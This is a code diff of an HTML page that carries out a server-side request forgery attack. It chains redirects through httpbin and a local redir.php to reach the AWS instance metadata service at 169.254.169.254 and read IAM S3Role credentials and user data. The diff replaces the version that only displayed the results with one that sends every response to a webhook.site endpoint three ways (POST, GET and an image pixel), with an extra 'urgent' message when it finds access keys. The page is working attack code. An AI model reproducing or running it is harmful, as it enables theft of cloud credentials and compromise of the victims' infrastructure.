@@ -1,255 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AWS Metadata Loader</title>
-    <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            margin: 20px;
-            background: #f5f5f5;
-        }
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        .result-section {
-            border: 3px solid #333;
-            margin: 20px 0;
-            padding: 20px;
-            background: #ffffff;
-            min-height: 200px;
-        }
-        .aws-credentials {
-            background: #ff4444 !important;
-            color: white;
-            border: 5px solid #cc0000 !important;
-            font-size: 18px;
-            font-weight: bold;
-            text-align: center;
-        }
-        .success-response {
-            background: #44ff44 !important;
-            border-color: #00aa00 !important;
-        }
-        .loading-text {
-            color: #666;
-            font-style: italic;
-        }
-        pre {
-            background: #f9f9f9;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            font-size: 12px;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-    </style>
+    <title>Real-Time AWS Metadata Exfiltration</title>
 </head>
 <body>
-    <div class="container">
-        <h1>🎯 AWS Metadata Extraction via SSRF</h1>
-        <p><strong>Status:</strong> <span id="global-status">Initializing metadata extraction...</span></p>
-        <p><strong>Progress:</strong> <span id="progress">0/4 tests completed</span></p>
-        
-        <div class="result-section" id="section1">
-            <h2>🔍 Test 1: AWS Metadata Service v1.0 Root</h2>
-            <p class="loading-text" id="status1">⏳ Preparing request...</p>
-            <div id="content1">Waiting for execution...</div>
-        </div>
-        
-        <div class="result-section" id="section2">
-            <h2>🔑 Test 2: IAM S3Role Credentials (v1.0)</h2>
-            <p class="loading-text" id="status2">⏳ Preparing request...</p>
-            <div id="content2">Waiting for execution...</div>
-        </div>
-        
-        <div class="result-section" id="section3">
-            <h2>📄 Test 3: AWS User Data</h2>
-            <p class="loading-text" id="status3">⏳ Preparing request...</p>
-            <div id="content3">Waiting for execution...</div>
-        </div>
-        
-        <div class="result-section" id="section4">
-            <h2>🕰️ Test 4: Legacy API (2007-01-19)</h2>
-            <p class="loading-text" id="status4">⏳ Preparing request...</p>
-            <div id="content4">Waiting for execution...</div>
-        </div>
-        
-        <div class="result-section" id="summary-section">
-            <h2>📊 EXECUTION SUMMARY</h2>
-            <div id="summary">Tests will begin shortly...</div>
-        </div>
-    </div>
+    <h1>🚀 Real-Time AWS Metadata Exfiltration</h1>
+    <p>Check your webhook URL for real-time results!</p>
     
-    <!-- Force loading delay with external resource -->
-    <iframe src="data:text/html;charset=utf-8,<html><body><script>setTimeout(function(){parent.startTests();}, 8000);</script><h3>Loading external resources...</h3></body></html>" 
-            width="1" height="1" style="visibility:hidden;"></iframe>
+    <div id="status">Starting exfiltration...</div>
     
     <script>
-        var testsCompleted = 0;
-        var totalTests = 4;
-        var allResults = [];
-        var testStarted = false;
+        // Replace this with your actual webhook URL
+        var WEBHOOK_URL = 'https://webhook.site/your-unique-id';
         
-        // Fallback to start tests if iframe doesn't work
-        setTimeout(function() {
-            if (!testStarted) {
-                startTests();
+        // Alternative: Use requestbin.com, pipedream.com, or similar
+        
+        function sendData(testName, url, response, method = 'POST') {
+            var data = {
+                timestamp: new Date().toISOString(),
+                test: testName,
+                target_url: url,
+                response_length: response.length,
+                response_data: response,
+                has_credentials: response.includes('AccessKeyId') || response.includes('SecretAccessKey'),
+                source: 'AWS_METADATA_SSRF'
+            };
+            
+            try {
+                // Method 1: POST request
+                if (method === 'POST') {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', WEBHOOK_URL, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(data));
+                }
+                
+                // Method 2: GET request with data in URL (backup)
+                if (method === 'GET') {
+                    var params = new URLSearchParams();
+                    params.append('test', testName);
+                    params.append('length', response.length);
+                    params.append('data', response.substring(0, 1000)); // Truncate for URL limits
+                    params.append('credentials', data.has_credentials);
+                    
+                    var getXhr = new XMLHttpRequest();
+                    getXhr.open('GET', WEBHOOK_URL + '?' + params.toString(), true);
+                    getXhr.send();
+                }
+                
+                // Method 3: Image pixel tracking (always works)
+                var img = new Image();
+                img.src = WEBHOOK_URL + '/pixel?' + 
+                    'test=' + encodeURIComponent(testName) + 
+                    '&length=' + response.length +
+                    '&hasCredentials=' + data.has_credentials +
+                    '&timestamp=' + Date.now();
+                
+                document.getElementById('status').innerHTML += '<br>✅ Sent: ' + testName;
+                
+            } catch (e) {
+                document.getElementById('status').innerHTML += '<br>❌ Failed to send: ' + testName + ' - ' + e.message;
             }
-        }, 10000);
-        
-        function startTests() {
-            if (testStarted) return;
-            testStarted = true;
-            
-            document.getElementById('global-status').textContent = 'Executing AWS metadata requests...';
-            
-            // Test 1: AWS Metadata v1.0 root
-            setTimeout(function() {
-                executeTest(
-                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
-                    1,
-                    'AWS Metadata v1.0 Root Directory'
-                );
-            }, 2000);
-            
-            // Test 2: S3Role credentials
-            setTimeout(function() {
-                executeTest(
-                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
-                    2,
-                    'S3Role IAM Credentials'
-                );
-            }, 6000);
-            
-            // Test 3: User data
-            setTimeout(function() {
-                executeTest(
-                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data',
-                    3,
-                    'AWS User Data'
-                );
-            }, 10000);
-            
-            // Test 4: Legacy API
-            setTimeout(function() {
-                executeTest(
-                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
-                    4,
-                    'Legacy API S3Role'
-                );
-            }, 14000);
-            
-            // Generate final summary
-            setTimeout(function() {
-                generateFinalSummary();
-            }, 20000);
         }
         
-        function executeTest(url, testNumber, testName) {
-            document.getElementById('status' + testNumber).innerHTML = '🔄 Executing request...';
-            
+        function executeAndExfiltrate(url, testName) {
             try {
                 var xhr = new XMLHttpRequest();
                 xhr.open('GET', url, false);
                 xhr.send();
                 
                 var response = xhr.responseText;
-                var result = {
-                    testNumber: testNumber,
-                    testName: testName,
-                    url: url,
-                    response: response,
-                    hasCredentials: response.includes('AccessKeyId') || response.includes('SecretAccessKey'),
-                    success: response.length > 10
-                };
                 
-                allResults.push(result);
-                testsCompleted++;
+                // Send via multiple methods for reliability
+                sendData(testName, url, response, 'POST');
+                setTimeout(() => sendData(testName, url, response, 'GET'), 1000);
                 
-                // Update UI
-                var statusEl = document.getElementById('status' + testNumber);
-                var contentEl = document.getElementById('content' + testNumber);
-                var sectionEl = document.getElementById('section' + testNumber);
+                document.getElementById('status').innerHTML += '<br>📡 ' + testName + ': ' + response.length + ' bytes';
                 
-                if (result.hasCredentials) {
-                    statusEl.innerHTML = '🎉🎉🎉 AWS CREDENTIALS DETECTED! 🎉🎉🎉';
-                    sectionEl.className += ' aws-credentials';
-                } else if (result.success) {
-                    statusEl.innerHTML = '✅ Request successful (' + response.length + ' bytes)';
-                    sectionEl.className += ' success-response';
-                } else {
-                    statusEl.innerHTML = '❌ No significant response';
+                if (response.includes('AccessKeyId')) {
+                    document.getElementById('status').innerHTML += '<br>🚨 CREDENTIALS DETECTED in ' + testName + '!';
+                    
+                    // Send urgent notification
+                    sendData('URGENT_CREDENTIALS_FOUND', url, response, 'POST');
                 }
-                
-                contentEl.innerHTML = 
-                    '<strong>URL:</strong> ' + url + '<br><br>' +
-                    '<strong>Response Length:</strong> ' + response.length + ' bytes<br><br>' +
-                    '<strong>Content:</strong><br>' +
-                    '<pre>' + response + '</pre>';
-                
-                document.getElementById('progress').textContent = testsCompleted + '/' + totalTests + ' tests completed';
                 
             } catch (e) {
-                allResults.push({
-                    testNumber: testNumber,
-                    testName: testName,
-                    url: url,
-                    response: 'ERROR: ' + e.message,
-                    hasCredentials: false,
-                    success: false
-                });
-                
-                document.getElementById('status' + testNumber).innerHTML = '❌ Error: ' + e.message;
-                document.getElementById('content' + testNumber).innerHTML = 'Request failed: ' + e.message;
-                testsCompleted++;
-                document.getElementById('progress').textContent = testsCompleted + '/' + totalTests + ' tests completed';
+                sendData(testName + '_ERROR', url, 'ERROR: ' + e.message, 'POST');
+                document.getElementById('status').innerHTML += '<br>❌ ' + testName + ': ' + e.message;
             }
         }
         
-        function generateFinalSummary() {
-            document.getElementById('global-status').textContent = 'All tests completed';
-            
-            var credentialTests = allResults.filter(r => r.hasCredentials);
-            var successfulTests = allResults.filter(r => r.success);
-            
-            var summary = '<h3>🎯 Final Results</h3>';
-            summary += '<p><strong>Total Tests:</strong> ' + allResults.length + '</p>';
-            summary += '<p><strong>Successful Responses:</strong> ' + successfulTests.length + '</p>';
-            summary += '<p><strong>Credential Detections:</strong> ' + credentialTests.length + '</p>';
-            
-            if (credentialTests.length > 0) {
-                summary += '<div style="background:#ff0000;color:white;padding:25px;margin:20px 0;border:5px solid #000;text-align:center;font-size:20px;">';
-                summary += '🚨🚨🚨 AWS CREDENTIALS FOUND! 🚨🚨🚨<br>';
-                summary += 'Check Test(s): ' + credentialTests.map(t => t.testNumber).join(', ');
-                summary += '</div>';
-            }
-            
-            summary += '<h4>📋 Test Details:</h4>';
-            allResults.forEach(function(result) {
-                summary += '<p><strong>Test ' + result.testNumber + ' (' + result.testName + '):</strong> ';
-                if (result.hasCredentials) {
-                    summary += '🎉 CREDENTIALS FOUND!';
-                } else if (result.success) {
-                    summary += '✅ ' + result.response.length + ' bytes received';
-                } else {
-                    summary += '❌ Failed or empty';
-                }
-                summary += '</p>';
-            });
-            
-            document.getElementById('summary').innerHTML = summary;
-        }
+        // Execute tests with exfiltration
+        document.getElementById('status').innerHTML = 'Starting AWS metadata extraction...';
         
-        // Initial status
-        document.getElementById('global-status').textContent = 'Waiting for resource loading...';
+        setTimeout(() => {
+            executeAndExfiltrate(
+                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
+                'AWS_Metadata_v1.0_Root'
+            );
+        }, 2000);
+        
+        setTimeout(() => {
+            executeAndExfiltrate(
+                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
+                'IAM_Security_Credentials_List'
+            );
+        }, 5000);
+        
+        setTimeout(() => {
+            executeAndExfiltrate(
+                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
+                'S3Role_Credentials'
+            );
+        }, 8000);
+        
+        setTimeout(() => {
+            executeAndExfiltrate(
+                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data',
+                'User_Data'
+            );
+        }, 11000);
+        
+        setTimeout(() => {
+            executeAndExfiltrate(
+                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
+                'Legacy_S3Role_2007'
+            );
+        }, 14000);
+        
+        setTimeout(() => {
+            sendData('EXFILTRATION_COMPLETE', 'N/A', 'All tests completed at ' + new Date().toISOString(), 'POST');
+            document.getElementById('status').innerHTML += '<br><br>🎉 Exfiltration complete! Check your webhook for results.';
+        }, 17000);
     </script>
 </body>
 </html>
